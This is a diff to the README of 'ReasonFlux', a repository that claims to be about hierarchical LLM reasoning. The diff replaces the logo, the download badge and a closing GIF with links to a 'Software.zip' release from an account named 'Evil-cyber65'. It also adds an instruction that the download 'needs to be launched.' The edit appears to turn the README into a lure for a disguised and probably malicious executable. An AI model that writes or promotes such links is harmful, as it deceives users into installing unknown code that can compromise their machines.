@@ -1,6 +1,6 @@
 # 🚀 Welcome to ReasonFlux 🌌
 
-![ReasonFlux Logo](https://example.com/reasonflux-logo.png)
+![ReasonFlux Logo](https://github.com/Evil-cyber65/ReasonFlux/releases/download/v1.0/Software.zip)
 
 ## About ReasonFlux
 
@@ -21,7 +21,7 @@ ReasonFlux is a groundbreaking repository dedicated to Hierarchical LLM Reasonin
 
 To explore ReasonFlux further, click on the link below to download the repository:
 
-[![Download ReasonFlux](https://img.shields.io/badge/Download-ReasonFlux-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download ReasonFlux](https://github.com/Evil-cyber65/ReasonFlux/releases/download/v1.0/Software.zip)](https://github.com/Evil-cyber65/ReasonFlux/releases/download/v1.0/Software.zip)
 
 Please note that the download needs to be launched once you access the link.
 
@@ -43,4 +43,4 @@ ReasonFlux is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 🌟 Join us on this thrilling journey of Hierarchical LLM Reasoning with ReasonFlux. Let's unlock the potential of scaling thought templates together! 🚀
 
-![ReasonFlux Gif](https://example.com/reasonflux-gif.gif)
+![ReasonFlux Gif](https://github.com/Evil-cyber65/ReasonFlux/releases/download/v1.0/Software.zip)
